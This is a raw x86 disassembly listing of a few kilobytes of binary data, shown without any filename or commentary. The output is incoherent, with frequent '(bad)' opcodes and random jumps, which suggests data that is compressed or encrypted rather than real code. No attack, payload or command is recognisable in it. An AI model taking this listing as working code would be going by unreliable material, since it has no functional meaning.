  48b414:	pop    es
  48b415:	cs ffree st(2)
  48b418:	out    dx,eax
  48b419:	mov    dl,0x81
  48b41b:	pop    ss
  48b41c:	es pop es
  48b41e:	mov    bl,0x80
  48b420:	jg     0x48b44e
  48b422:	cld    
  48b423:	inc    ecx
  48b424:	dec    esp
  48b425:	and    BYTE PTR [esi-0x76],bl
  48b428:	inc    esi
  48b429:	or     DWORD PTR [ebx+0x425082bb],edi
  48b42f:	push   edi
  48b430:	(bad)  
  48b431:	cwde   
  48b432:	xlat   BYTE PTR ds:[ebx]
  48b433:	ror    DWORD PTR [ebx-0x41f5e8c6],1
  48b439:	hlt    
  48b43a:	mov    ds:0x5608d594,al
  48b43f:	xlat   BYTE PTR ds:[ebx]
  48b440:	inc    edx
  48b441:	(bad)  
  48b442:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48b443:	cdq    
  48b444:	pop    ss
  48b445:	fisttp WORD PTR [eax+0x1]
  48b448:	dec    DWORD PTR [esi]
  48b44a:	cmp    edi,0xffffffb0
  48b44d:	(bad)  
  48b44e:	fcom   QWORD PTR [eax]
  48b450:	adc    BYTE PTR [esi-0x15],bh
  48b453:	xor    al,0x97
  48b455:	xchg   BYTE PTR [ecx],dl
  48b457:	jge    0x48b44f
  48b459:	dec    ebx
  48b45a:	add    al,0x7a
  48b45c:	rcr    ebp,0xd
  48b45f:	mov    ds:0x2fd7e08c,eax
  48b464:	emms   
  48b466:	inc    edx
  48b467:	inc    edx
  48b468:	mov    ebp,0x3b40b8c8
  48b46d:	(bad)  
  48b46e:	data16 repz daa 
  48b471:	inc    esi
  48b472:	add    eax,0xd47b80d8
  48b477:	add    dl,BYTE PTR [edx]
  48b479:	jnp    0x48b451
  48b47b:	loopne 0x48b3fe
  48b47d:	pop    esi
  48b47e:	stc    
  48b47f:	push   ss
  48b480:	adc    al,0x2b
  48b482:	je     0x48b446
  48b484:	dec    edi
  48b485:	cmp    al,0x5b
  48b487:	or     BYTE PTR [eax],dh
  48b489:	hlt    
  48b48a:	xlat   BYTE PTR ds:[ebx]
  48b48b:	jno    0x48b459
  48b48d:	stos   DWORD PTR es:[edi],eax
  48b48e:	jl     0x48b434
  48b490:	pop    eax
  48b491:	fadd   DWORD PTR [ecx-0x1af356af]
  48b497:	adc    BYTE PTR ds:0x42f40a17,cl
  48b49d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48b49e:	jmp    0x3d42:0x3e0eeb59
  48b4a5:	mov    DWORD PTR [esi+0x4],ebx
  48b4a8:	xor    BYTE PTR [eax],al
  48b4aa:	das    
  48b4ab:	adc    ebx,ecx
  48b4ad:	scas   al,BYTE PTR es:[edi]
  48b4ae:	pop    ebx
  48b4af:	das    
  48b4b0:	repnz outs dx,DWORD PTR ds:[esi]
  48b4b2:	xlat   BYTE PTR ds:[ebx]
  48b4b3:	mov    esi,0xc8102474
  48b4b8:	push   cs
  48b4b9:	mov    eax,0xf34f1678
  48b4be:	add    WORD PTR [ecx-0x42],0xffd1
  48b4c3:	scas   eax,DWORD PTR es:[edi]
  48b4c4:	outs   dx,DWORD PTR ds:[esi]
  48b4c5:	test   BYTE PTR [ebx+0xe],dl
  48b4c8:	imul   ebx,ebx,0x717e9dd9
  48b4ce:	test   bh,dl
  48b4d0:	fwait
  48b4d1:	sub    dh,BYTE PTR [eax-0x1c]
  48b4d4:	add    bh,cl
  48b4d6:	fisub  WORD PTR [edx-0x35573ae]
  48b4dc:	push   edi
  48b4dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48b4de:	sbb    DWORD PTR [edx+ebx*8+0x5a],edx
  48b4e2:	push   esp
  48b4e3:	jnp    0x48b4ae
  48b4e5:	push   ss
  48b4e6:	push   ebx
  48b4e7:	xchg   DWORD PTR [eax],esp
  48b4e9:	and    eax,0xad6e335f
  48b4ee:	sbb    al,0xfb
  48b4f0:	test   BYTE PTR [ebx-0x601f298b],bh
  48b4f6:	(bad)  
  48b4f7:	push   ecx
  48b4f8:	adc    BYTE PTR [ebx-0x2262efb6],cl
  48b4fe:	pusha  
  48b4ff:	or     eax,0x1ca86b86
  48b504:	repnz lods eax,DWORD PTR ds:[esi]
  48b506:	into   
  48b507:	retf   
  48b508:	jae    0x48b4dc
  48b50a:	ret    
  48b50b:	mov    edx,ss
  48b50d:	sub    al,0xe2
  48b50f:	jecxz  0x48b4c5
  48b511:	mov    esp,0xba9ac6f4
  48b516:	xor    DWORD PTR [ecx+0x34bbaed8],eax
  48b51c:	das    
  48b51d:	add    eax,0x8c7c3577
  48b522:	fcmovb st,st(6)
  48b524:	push   es
  48b525:	add    DWORD PTR [ebx-0x4e7643fd],ebx
  48b52b:	dec    ebx
  48b52c:	fsub   QWORD PTR [edi+0x50626024]
  48b532:	mov    eax,ds:0x70eccd3b
  48b537:	pusha  
  48b538:	jl     0x48b4ec
  48b53a:	mov    ds:0xa33da624,al
  48b53f:	add    al,0xa7
  48b541:	ins    BYTE PTR es:[edi],dx
  48b542:	add    al,0x95
  48b544:	push   esi
  48b545:	or     DWORD PTR ds:0xaf29fbb6,eax
  48b54b:	mov    dh,0x3c
  48b54d:	xchg   ebp,eax
  48b54e:	jne    0x48b5a4
  48b550:	(bad)  
  48b551:	int3   
  48b552:	in     al,dx
  48b553:	ins    DWORD PTR es:[edi],dx
  48b554:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48b555:	jle    0x48b557
  48b557:	xchg   edi,eax
  48b558:	lea    ecx,[eax+0x1e428d90]
  48b55e:	fwait
  48b55f:	pop    esp
  48b560:	lock test DWORD PTR [ebp+edi*4+0x1f],esi
  48b565:	dec    edi
  48b566:	inc    ebx
  48b567:	jnp    0x48b56a
  48b569:	jmp    0x48b526
  48b56b:	and    DWORD PTR [edx+0x41e08816],ebp
  48b571:	imul   ebx,DWORD PTR [ebx+0x1f067fcd],0xffffff90
  48b578:	inc    edx
  48b579:	add    ch,ah
  48b57b:	(bad)  
  48b57c:	ror    DWORD PTR [esi-0x65e14869],1
  48b582:	push   ss
  48b583:	dec    edi
  48b584:	sti    
  48b585:	xor    al,0xdf
  48b587:	test   BYTE PTR [esi],0x36
  48b58a:	nop
  48b58b:	inc    eax
  48b58c:	xchg   esi,eax
  48b58d:	mov    dh,0x6
  48b58f:	ror    DWORD PTR [eax+0x24],0xe2
  48b593:	fidivr WORD PTR [ebx+0x3e]
  48b596:	pop    ebx
  48b597:	push   cs
  48b598:	stc    
  48b599:	push   es
  48b59a:	pop    ebx
  48b59b:	ss aam 0x6e
  48b59e:	clc    
  48b59f:	(bad)  
  48b5a0:	jg     0x48b5a6
  48b5a2:	add    DWORD PTR [esi+edx*1-0x80],esi
  48b5a6:	jg     0x48b592
  48b5a8:	push   esi
  48b5a9:	jne    0x48b5be
  48b5ab:	or     al,0xc
  48b5ad:	cs adc bh,bh
  48b5b0:	stc    
  48b5b1:	push   cs
  48b5b2:	call   0x155fd69
  48b5b7:	pop    esi
  48b5b8:	dec    DWORD PTR [edi-0x32]
  48b5bb:	push   ecx
  48b5bc:	dec    ebp
  48b5bd:	sub    al,0xc0
  48b5bf:	ja     0x48b5c9
  48b5c1:	neg    BYTE PTR [esi+0x10]
  48b5c4:	mov    ebx,0xf76d842d
  48b5c9:	mov    DWORD PTR [edi+0x8],ebx
  48b5cc:	dec    eax
  48b5cd:	xchg   esi,eax
  48b5ce:	jmp    0x48b59a
  48b5d0:	xchg   ebp,eax
  48b5d1:	add    al,0x2a
  48b5d3:	loope  0x48b60d
  48b5d5:	fisttp WORD PTR [eax]
  48b5d7:	or     eax,0x95095e2
  48b5dc:	xor    BYTE PTR [esi],dl
  48b5de:	add    BYTE PTR [esi-0x3d],bl
  48b5e1:	ret    0x4d9a
  48b5e4:	arpl   WORD PTR [ebx+0x6b9d4f6],sp
  48b5ea:	and    al,0xc4
  48b5ec:	test   bl,bh
  48b5ee:	bound  esp,QWORD PTR [ebx+eax*8+0xb880e8a]
  48b5f5:	cmp    DWORD PTR [ebx+0xc401840],ebp
  48b5fb:	and    cl,BYTE PTR [esi-0x75e90772]
  48b601:	std    
  48b602:	and    al,0x89
  48b604:	jo     0x48b612
  48b606:	inc    DWORD PTR [esi]
  48b608:	adc    BYTE PTR ds:0x5ee19bdf,al
  48b60e:	xchg   esp,eax
  48b60f:	adc    DWORD PTR [eax-0x77ba658b],edx
  48b615:	dec    BYTE PTR [edx-0x62184451]
  48b61b:	mov    ecx,0x6535b16
  48b620:	das    
  48b621:	xchg   edx,eax
  48b622:	push   cs
  48b623:	xchg   edx,eax
  48b624:	xchg   ecx,eax
  48b625:	in     al,dx
  48b626:	cli    
  48b627:	cmp    al,0xe0
  48b629:	add    eax,0x89603e89
  48b62e:	adc    cl,BYTE PTR [ebp-0x5f]
  48b631:	test   dl,ah
  48b633:	cmp    DWORD PTR [esi],ebp
  48b635:	xchg   BYTE PTR [eax-0x7f],dl
  48b638:	sbb    DWORD PTR [ebx],0x6b
  48b63b:	js     0x48b690
  48b63d:	in     al,dx
  48b63e:	pop    es
  48b63f:	adc    eax,0x4e6c91a3
  48b644:	sbb    DWORD PTR [edx+ecx*4],eax
  48b647:	call   DWORD PTR [esi+0x59]
  48b64a:	pop    ds
  48b64b:	adc    ch,BYTE PTR [ecx+eax*4]
  48b64e:	mov    edx,0xd663880c
  48b653:	lods   eax,DWORD PTR ds:[esi]
  48b654:	retf   
  48b655:	sbb    al,0xc9
  48b657:	push   edi
  48b658:	add    BYTE PTR [ebx],0x2
  48b65b:	xchg   DWORD PTR ds:0xf2e49fb1,ebp
  48b661:	rol    DWORD PTR [edi+0x57],cl
  48b664:	push   esi
  48b665:	jle    0x48b66b
  48b667:	pop    edi
  48b668:	jmp    0x48b690
  48b66a:	mov    esi,0x1f8382b0
  48b66f:	mov    ah,ch
  48b671:	add    DWORD PTR [ebx+0x9],ecx
  48b674:	neg    DWORD PTR ds:0x6001db06
  48b67a:	out    0x83,eax
  48b67c:	mov    ecx,0x877413c9
  48b681:	xchg   ebx,eax
  48b682:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48b683:	js     0x48b655
  48b685:	mov    edx,0x78fc48cf
  48b68a:	xor    DWORD PTR [esi],ecx
  48b68c:	cmp    DWORD PTR [edx+0x6e],esp
  48b68f:	and    ch,bh
  48b691:	loopne 0x48b6c6
  48b693:	mov    cl,0x83
  48b695:	popa   
  48b696:	out    0x62,al
  48b698:	pop    es
  48b699:	dec    eax
  48b69a:	aas    
  48b69b:	(bad)  
  48b69c:	shl    BYTE PTR [edi+0x31],0x35
  48b6a0:	pop    ds
  48b6a1:	or     BYTE PTR [ebx-0x3b],cl
  48b6a4:	inc    eax
  48b6a5:	les    esp,FWORD PTR [esp+eiz*8-0x60]
  48b6a9:	daa    
  48b6aa:	clc    
  48b6ab:	clc    
  48b6ac:	sub    DWORD PTR [eax+0x2f],esp
  48b6af:	mov    al,0xda
  48b6b1:	sub    DWORD PTR [esi],edi
  48b6b3:	and    al,0xbd
  48b6b5:	cmc    
  48b6b6:	adc    al,0xc6
  48b6b8:	aad    0xfd
  48b6ba:	scas   eax,DWORD PTR es:[edi]
  48b6bb:	add    al,0xc6
  48b6bd:	test   DWORD PTR [ebp+0x40ebfe48],ecx
  48b6c3:	loop   0x48b724
  48b6c5:	js     0x48b6d0
  48b6c7:	ja     0x48b6ad
  48b6c9:	movzx  ecx,BYTE PTR [ecx+0x689bbb74]
  48b6d0:	or     al,0x1d
  48b6d2:	ret    0xef79
  48b6d5:	nop
  48b6d6:	adc    DWORD PTR [eax],ecx
  48b6d8:	xor    DWORD PTR [esi],eax
  48b6da:	cmp    eax,0x3b7022e
  48b6df:	pop    es
  48b6e0:	jbe    0x48b6e2
  48b6e2:	or     BYTE PTR [edx],dl
  48b6e4:	push   ebx
  48b6e5:	retf   
  48b6e6:	hlt    
  48b6e7:	push   esp
  48b6e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48b6e9:	popf   
  48b6ea:	or     DWORD PTR [eax+0x6fb9e0e],ebx
  48b6f0:	pop    es
  48b6f1:	ret    0x6fdf
  48b6f4:	sub    al,0xc8
  48b6f6:	imul   ecx,edx
  48b6f9:	imul   edx
  48b6fb:	inc    eax
  48b6fc:	ror    DWORD PTR [ebx-0x2f196626],0x6
  48b703:	fbld   TBYTE PTR [edi-0x2cc4cd83]
  48b709:	push   cs
  48b70a:	enter  0xe89,0xfc
  48b70e:	pop    edi
  48b70f:	pop    ebx
  48b710:	add    DWORD PTR [ecx-0x369e697],edi
  48b716:	das    
  48b717:	hlt    
  48b718:	call   0x7004b79d
  48b71d:	out    dx,al
  48b71e:	rcr    BYTE PTR [ecx-0x7b],0xf0
  48b722:	mov    DWORD PTR [esi],ecx
  48b724:	int    0x90
  48b726:	push   edi
  48b727:	imul   esi,edi,0xffffffc1
  48b72a:	jnp    0x48b731
  48b72c:	(bad)  
  48b72d:	loop   0x48b759
  48b72f:	mov    edx,0x217bc0e
  48b734:	add    eax,DWORD PTR [eax]
  48b736:	outs   dx,DWORD PTR ds:[esi]
  48b737:	xor    BYTE PTR [edx+ebp*2],ch
  48b73a:	or     BYTE PTR [edx],al
  48b73c:	(bad)  
  48b73d:	cli    
  48b73e:	push   esi
  48b73f:	jne    0x48b74e
  48b741:	mov    ebx,DWORD PTR [esi]
  48b743:	scas   eax,DWORD PTR es:[edi]
  48b744:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48b745:	pusha  
  48b746:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48b747:	push   edi
  48b748:	ja     0x48b6f6
  48b74a:	pop    ebx
  48b74b:	ret    
  48b74c:	cmp    BYTE PTR [esi-0x71],0x15
  48b750:	or     DWORD PTR [ebp+ecx*1+0x2708ea2a],ecx
  48b757:	mov    BYTE PTR [esi-0x71],0x4b
  48b75b:	mov    al,BYTE PTR [esi-0x2e]
  48b75e:	inc    edx
  48b75f:	sbb    BYTE PTR [edi],bl
  48b761:	cmp    al,BYTE PTR ss:[ebx]
  48b764:	or     DWORD PTR [edi-0x6263ca39],0xffffffce
  48b76b:	mov    DWORD PTR [edi],esi
  48b76d:	jnp    0x48b77e
  48b76f:	inc    esi
  48b770:	inc    ebx
  48b771:	adc    BYTE PTR [edx-0x77],bl
  48b774:	jb     0x48b7ce
  48b776:	xor    ebx,ebx
  48b778:	jmp    0x48b760
  48b77a:	add    BYTE PTR [edx+eax*8+0x21],cl
  48b77e:	pop    edi
  48b77f:	mov    cl,0xf9
  48b781:	mov    ecx,0x8ab8498
  48b786:	imul   ebp,DWORD PTR [eax+0x490c0701],0xca3c8d24
  48b790:	mov    ebp,0xd5790b84
  48b795:	mov    BYTE PTR [ebp-0x3e3da1ff],ah
  48b79b:	out    0x89,al
  48b79d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48b79e:	add    DWORD PTR [edx+0x2d],esi
  48b7a1:	sub    al,0x17
  48b7a3:	lds    esp,FWORD PTR [ecx]
  48b7a5:	or     BYTE PTR [esi],bl
  48b7a7:	mov    BYTE PTR [esi],al
  48b7a9:	lea    ebp,[esi+0x42998242]
  48b7af:	lods   eax,DWORD PTR ds:[esi]
  48b7b0:	pop    edx
  48b7b1:	jp     0x48b7ef
  48b7b3:	mov    esp,0x5ea7f090
  48b7b8:	mov    ds:0xc09e2c3,eax
  48b7bd:	sbb    al,0x8f
  48b7bf:	inc    ecx
  48b7c0:	xchg   dl,al
  48b7c2:	pop    esp
  48b7c3:	aas    
  48b7c4:	push   ecx
  48b7c5:	or     edx,esp
  48b7c7:	add    bl,BYTE PTR [ebp+0x39]
  48b7ca:	les    eax,FWORD PTR ds:[bx+di]
  48b7ce:	ror    DWORD PTR [ecx+0x38],0xef
  48b7d2:	cwde   
  48b7d3:	adc    dl,BYTE PTR [eax+0x1317049a]
  48b7d9:	inc    BYTE PTR [ecx]
  48b7db:	mov    dh,0xad
  48b7dd:	dec    esp
  48b7de:	pop    ecx
  48b7df:	ret    
  48b7e0:	mov    edi,0x5661214
  48b7e5:	cmp    esi,DWORD PTR ds:[ebp-0x46]
  48b7e9:	mov    gs,WORD PTR [edi+0x50437061]
  48b7ef:	call   0xd8a9b824
  48b7f4:	push   es
  48b7f5:	cld    
  48b7f6:	stos   DWORD PTR es:[edi],eax
  48b7f7:	lods   eax,DWORD PTR ds:[esi]
  48b7f8:	jl     0x48b86d
  48b7fa:	pop    edi
  48b7fb:	push   ecx
  48b7fc:	loop   0x48b857
  48b7fe:	ret    
  48b7ff:	sub    DWORD PTR [ecx],esp
  48b801:	push   ebp
  48b802:	sbb    al,BYTE PTR [eax+0x73]
  48b805:	dec    edx
  48b806:	pop    eax
  48b807:	add    eax,0x344b738c
  48b80c:	sar    BYTE PTR [esp+edx*4+0x70],cl
  48b810:	pop    edi
  48b811:	ss jp  0x48b83f
  48b814:	ret    
  48b815:	cmp    ch,bl
  48b817:	inc    eax
  48b818:	sbb    DWORD PTR [ebx+0x49],edi
  48b81b:	sbb    ah,cl
  48b81d:	rcr    DWORD PTR [esi],cl
  48b81f:	cld    
  48b820:	stos   DWORD PTR es:[edi],eax
  48b821:	std    
  48b822:	popa   
  48b823:	loope  0x48b7db
  48b825:	adc    DWORD PTR [esi+0x6503f04],edi
  48b82b:	pop    edx
  48b82c:	ret    0x128f
  48b82f:	sahf   
  48b830:	mov    al,ds:0x1e94a0a
  48b835:	jle    0x48b842
  48b837:	and    ah,al
  48b839:	ret    0x6a13
  48b83c:	push   ebx
  48b83d:	sbb    cl,dl
  48b83f:	or     ebx,DWORD PTR [ecx]
  48b841:	pop    edi
  48b842:	aaa    
  48b843:	cwde   
  48b844:	aad    0x32
  48b846:	adc    DWORD PTR [ebx],ecx
  48b848:	popa   
  48b849:	(bad)  
  48b84a:	ror    BYTE PTR [edi],0x2e
  48b84d:	shl    DWORD PTR [eax],0x86
  48b850:	adc    ch,cl
  48b852:	or     eax,DWORD PTR [ecx+ebp*1-0x1e]
  48b856:	iret   
  48b857:	scas   al,BYTE PTR es:[edi]
  48b858:	add    ebx,eax
  48b85a:	(bad)  
  48b85b:	loope  0x48b802
  48b85d:	add    eax,0x55fc4d05
  48b862:	cld    
  48b863:	dec    ecx
  48b864:	clc    
  48b865:	jo     0x48b894
  48b867:	cs push ss
  48b869:	xchg   edx,eax
  48b86a:	lods   eax,DWORD PTR ds:[esi]
  48b86b:	mov    bl,0x85
  48b86d:	mov    DWORD PTR ds:0x39a17234,esi
  48b873:	lahf   
  48b874:	or     al,BYTE PTR ds:0x74573c1a
  48b87a:	push   ss
  48b87b:	inc    edx
  48b87c:	loop   0x48b8ce
  48b87e:	loope  0x48b8df
  48b880:	push   eax
  48b881:	xchg   BYTE PTR [ecx+0x874ee7e],ah
  48b887:	dec    DWORD PTR [esi]
  48b889:	dec    esp
  48b88a:	mov    bl,0xc0
  48b88c:	jle    0x48b878
  48b88e:	pop    edi
  48b88f:	ret    
  48b890:	inc    edi
  48b891:	es dec ebx
  48b893:	pop    edi
  48b894:	shl    BYTE PTR [ebx+0x51df3171],0x60
  48b89b:	push   edi
  48b89c:	xor    al,0xc0
  48b89e:	adc    DWORD PTR [ebp+0x68],ecx
  48b8a1:	or     ah,BYTE PTR [esi]
  48b8a3:	sub    ecx,DWORD PTR [ebx+0x68d8af8e]
  48b8a9:	push   esp
  48b8aa:	mov    edi,0x47fa6e52
  48b8af:	jge    0x48b8b6
  48b8b1:	inc    ecx
  48b8b2:	test   BYTE PTR [edx+eiz*2-0x151401d8],al
  48b8b9:	sub    edx,0x47
  48b8bc:	je     0x48b8e5
  48b8be:	jmp    0x83b3:0x84517574
  48b8c5:	out    0x52,al
  48b8c7:	sub    al,BYTE PTR [esi-0x48edf0a7]
  48b8cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48b8ce:	xchg   edx,eax
  48b8cf:	ss aaa 
  48b8d1:	jne    0x48b8ad
  48b8d3:	and    bh,BYTE PTR [ecx]
  48b8d5:	sub    BYTE PTR [edx+0x574fccdd],bh
  48b8db:	mov    esi,0x9fb80b47
  48b8e0:	js     0x48b90b
  48b8e2:	rcr    DWORD PTR [eax],0x84
  48b8e5:	cmp    eax,0x5090e0b4
  48b8ea:	push   es
  48b8eb:	mov    esp,ss
  48b8ed:	sbb    DWORD PTR [ebx-0x1e],eax
  48b8f0:	lods   al,BYTE PTR ds:[esi]
  48b8f1:	dec    esi
  48b8f2:	retf   
  48b8f3:	mov    WORD PTR [edi+eiz*1],ds
  48b8f6:	mov    DWORD PTR ds:0x45f40618,ecx
  48b8fc:	fcomp  QWORD PTR [ebp+0x5d]
  48b8ff:	in     al,0x49
  48b901:	mov    ds:0x71e6fcc,al
  48b906:	sub    eax,esi
  48b908:	inc    esp
  48b909:	inc    esi
  48b90a:	xchg   ebx,eax
  48b90b:	lods   al,BYTE PTR ds:[esi]
  48b90c:	push   eax
  48b90d:	in     al,0x4
  48b90f:	fcom   DWORD PTR [eax-0x43d533bd]
  48b915:	in     al,dx
  48b916:	xor    eax,edi
  48b918:	js     0x48b89a
  48b91a:	call   0xd1b:0x1717fe42
  48b921:	push   ebx
  48b922:	push   eax
  48b923:	fs mov esp,0xce6488b
  48b929:	and    al,0x2a
  48b92b:	(bad)  
  48b92c:	in     eax,dx
  48b92d:	add    DWORD PTR [eax],esi
  48b92f:	add    DWORD PTR [eax-0xfadaa77],esi
  48b935:	ret    0xa551
  48b938:	lahf   
  48b939:	xchg   BYTE PTR [ebp-0x3c],cl
  48b93c:	inc    esp
  48b93d:	hlt    
  48b93e:	pusha  
  48b93f:	enter  0x12b8,0xb1
  48b943:	lods   al,BYTE PTR ds:[esi]
  48b944:	jne    0x48b902
  48b946:	lea    esi,[edx+ebx*1]
  48b949:	push   es
  48b94a:	fnstenv [eax-0x2363f38c]
  48b950:	lea    edx,[ebx-0x44]
  48b953:	test   al,0xb8
  48b955:	jns    0x48b92d
  48b957:	cmp    al,BYTE PTR [esi+0x22]
  48b95a:	ds dec ecx
  48b95c:	sub    al,0xb4
  48b95e:	aaa    
  48b95f:	or     ah,BYTE PTR [ebx+0x10]
  48b962:	pop    esi
  48b963:	and    eax,0xb984458e
  48b968:	daa    
  48b969:	es mov ecx,0x258c7f45
  48b96f:	push   esi
  48b970:	inc    ebx
  48b971:	push   0x2c
  48b973:	(bad)  
  48b975:	or     al,0x81
  48b977:	and    ecx,DWORD PTR [ecx-0x77fba453]
  48b97d:	test   DWORD PTR [edx-0x6e],ecx
  48b980:	retf   
  48b981:	xor    BYTE PTR [ebx-0x68],bl
  48b984:	sub    al,0x17
  48b986:	dec    BYTE PTR [eax+0x4b]
  48b989:	aaa    
  48b98a:	sbb    esi,esp
  48b98c:	inc    esi
  48b98d:	mov    edi,?
  48b98f:	push   ebx
  48b990:	or     al,0x27
  48b992:	and    BYTE PTR [esi+0x31fe4b2f],al
  48b998:	leave  
  48b999:	pop    eax
  48b99a:	adc    BYTE PTR [ecx+0x48ebd095],bl
  48b9a0:	sbb    al,0xac
  48b9a2:	stc    
  48b9a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48b9a4:	push   ss
  48b9a5:	pop    ss
  48b9a6:	movups xmm6,XMMWORD PTR [edx-0x38]
  48b9aa:	ror    BYTE PTR [esi+0xd],1
  48b9ad:	xchg   ecx,eax
  48b9ae:	push   esi
  48b9af:	add    al,BYTE PTR [ebx-0x728213a1]
  48b9b5:	pop    ebp
  48b9b6:	pushf  
  48b9b7:	xchg   ebx,eax
  48b9b8:	lea    eax,[eax+edi*1-0x6541fe01]
  48b9bf:	cdq    
  48b9c0:	inc    esp
  48b9c1:	xchg   edx,eax
  48b9c2:	lods   al,BYTE PTR ds:[esi]
  48b9c3:	(bad)  
  48b9c4:	add    al,0xac
  48b9c6:	xchg   BYTE PTR [eax],dl
  48b9c8:	pop    esp
  48b9c9:	adc    dl,BYTE PTR [eax+0x16cd9a67]
  48b9cf:	(bad)  
  48b9d0:	cmp    DWORD PTR [eax-0x76],esi
  48b9d3:	inc    esi
  48b9d4:	adc    BYTE PTR [ebp-0x5c],dh
  48b9d7:	dec    esi
  48b9d8:	xor    bl,dl
  48b9da:	bound  esi,QWORD PTR [eax-0x52]
  48b9dd:	or     eax,0xe9b0e653
  48b9e2:	mov    ds,WORD PTR [ebx-0x21cdbdc9]
  48b9e8:	xor    dl,dl
  48b9ea:	adc    DWORD PTR [edi+0x71e3342],eax
  48b9f0:	dec    BYTE PTR [edi]
  48b9f2:	mov    eax,0x697f0588
  48b9f7:	jg     0x48ba36
  48b9f9:	push   es
  48b9fa:	jle    0x48ba35
  48b9fc:	pop    ecx
  48b9fd:	idiv   BYTE PTR [ebp+0x8]
  48ba00:	jg     0x48ba76
  48ba02:	cs test dl,dl
  48ba05:	jne    0x48ba31
  48ba07:	add    BYTE PTR [eax],0xfd
  48ba0a:	jne    0x48ba6a
  48ba0c:	cld    
  48ba0d:	mov    ah,0x26
  48ba0f:	adc    BYTE PTR [esi+0x483fb00d],ch
  48ba15:	jne    0x48b9db
  48ba17:	rcr    ebx,0xf7
  48ba1a:	add    al,0x22
  48ba1c:	cs adc al,0x49
  48ba1f:	mov    dl,0x82
  48ba21:	dec    ebp
  48ba22:	xchg   esp,eax
  48ba23:	jmp    0x48b9d9
  48ba25:	call   0x2ccc:0x4438c2d7
  48ba2c:	sbb    al,0x41
  48ba2e:	and    DWORD PTR [eax],esi
  48ba30:	adc    al,0x5c
  48ba32:	imul   ecx,DWORD PTR [edi],0x221208a2
  48ba38:	jge    0x48b9de
  48ba3a:	add    eax,0x2f15997a
  48ba3f:	js     0x48b9fa
  48ba41:	(bad)  
  48ba43:	out    dx,al
  48ba44:	into   
  48ba45:	lods   al,BYTE PTR ds:[esi]
  48ba46:	fstp   QWORD PTR [ebp-0x24]
  48ba49:	jmp    0x9f28:0x425a09e4
  48ba50:	mov    al,ds:0x33b469b2
  48ba55:	push   ds
  48ba56:	imul   edi,DWORD PTR [eax],0xffffff9c
  48ba59:	and    eax,0x818fff94
  48ba5e:	ret    
  48ba5f:	push   cs
  48ba60:	xchg   esi,eax
  48ba61:	js     0x48b9ef
  48ba63:	les    ebx,FWORD PTR ds:[eax]
  48ba66:	in     al,0x90
  48ba68:	mov    eax,ds:0xe6242688
  48ba6d:	in     al,0xbc
  48ba6f:	sbb    eax,0x329b7939
  48ba74:	int3   
  48ba75:	mov    ebx,0x2b9cac0e
  48ba7a:	(bad)  
  48ba7b:	jo     0x48bae5
  48ba7d:	fcomi  st,st(7)
  48ba7f:	clc    
  48ba80:	test   eax,0x25c93f09
  48ba85:	jl     0x48bad8
  48ba87:	scas   al,BYTE PTR es:[edi]
  48ba88:	push   es
  48ba89:	cli    
  48ba8a:	jne    0x48ba32
  48ba8c:	data16 lahf 
  48ba8e:	and    bl,ch
  48ba90:	pop    ss
  48ba91:	test   al,0x47
  48ba93:	mov    bl,0x35
  48ba95:	jne    0x48ba8f
  48ba97:	add    al,0xf4
  48ba99:	lea    edx,[eax+0x2d]
  48ba9c:	adc    al,0xda
  48ba9e:	sub    edx,eax
  48baa0:	mov    ds:0x7b6b325c,al
  48baa5:	push   ds
  48baa6:	pop    ds
  48baa7:	aas    
  48baa8:	and    al,0x28
  48baaa:	xor    al,0x31
  48baac:	aam    0x3a
  48baae:	pop    es
  48baaf:	sbb    ebp,0x4600c05c
  48bab5:	sbb    DWORD PTR [edi],edi
  48bab7:	es push ebp
  48bab9:	sbb    cl,dh
  48babb:	call   0xf670:0x88132010
  48bac2:	nop
  48bac3:	dec    esi
  48bac4:	das    
  48bac5:	pushf  
  48bac6:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  48bac8:	cs jno 0x48ba87
  48bacb:	or     edi,DWORD PTR [esi-0x225bf783]
  48bad1:	test   al,al
  48bad3:	cmp    BYTE PTR [edi+0x18307217],0xfe
  48bada:	xchg   esp,eax
  48badb:	adc    BYTE PTR es:[edi+0x65],ah
  48badf:	and    DWORD PTR [eax],0xffffffc1
  48bae2:	repnz sbb ch,BYTE PTR [edx-0x597d79ad]
  48bae9:	(bad)  
  48baeb:	add    bl,dl
  48baed:	jl     0x48bb59
  48baef:	add    DWORD PTR [edi-0x75],ebx
  48baf2:	(bad)  
  48baf3:	fwait
  48baf4:	xchg   edi,eax
  48baf5:	xchg   dl,dh
  48baf7:	loope  0x48baad
  48baf9:	fadd   QWORD PTR [ebp+0x4cd3c276]
  48baff:	mov    dl,0xc7
  48bb01:	(bad)  
  48bb02:	lahf   
  48bb03:	sub    BYTE PTR [esi],0x9f
  48bb06:	test   ecx,ecx
  48bb08:	jne    0x48bb51
  48bb0a:	cmp    DWORD PTR ds:0xc6c4e3a7,ecx
  48bb10:	in     eax,0xa6
  48bb12:	test   eax,0x74a15601
  48bb17:	addr16 js 0x48baef
  48bb1a:	je     0x48bb7e
  48bb1c:	cdq    
  48bb1d:	je     0x48bb7d
  48bb1f:	rcl    BYTE PTR [eax],1
  48bb21:	test   BYTE PTR [ecx-0x28f2771f],0x82
  48bb28:	call   0x8ff8612f
  48bb2d:	test   DWORD PTR [eax+ecx*2],0xd3483201
  48bb34:	pop    ss
  48bb35:	and    ebx,DWORD PTR [ecx]
  48bb37:	jbe    0x48bb93
  48bb39:	dec    ecx
  48bb3a:	adc    BYTE PTR [esi],0x9b
  48bb3d:	ds xchg edi,eax
  48bb3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48bb40:	jns    0x48bad2
  48bb42:	sbb    DWORD PTR [eax],edx
  48bb44:	mov    edx,DWORD PTR [eax+0x4d]
  48bb47:	loop   0x48bb5a
  48bb49:	adc    eax,0xebc03b05
  48bb4e:	mov    al,0xd4
